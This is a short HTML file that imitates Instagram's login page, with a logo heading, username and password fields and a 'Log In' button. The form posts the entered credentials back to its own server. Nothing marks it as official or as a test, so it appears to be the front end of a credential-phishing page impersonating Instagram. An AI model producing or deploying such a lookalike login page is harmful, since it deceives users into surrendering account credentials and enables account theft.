<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 350px; margin: 0 auto; padding: 40px 0; }
        .logo { text-align: center; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        input { width: 100%; padding: 10px; box-sizing: border-box; background: #fafafa; border: 1px solid #ddd; }
        button { background-color: #0095f6; color: white; border: none; padding: 10px; width: 100%; font-weight: bold; }
    </style>
</head>
<body>
    <div class="logo">
        <h2>Instagram</h2>
    </div>
    <form method="POST">
        <div class="form-group">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
        </div>
        <div class="form-group">
            <input type="password" name="password" placeholder="Password" required>
        </div>
        <button type="submit">Log In</button>
    </form>
</body>
</html>
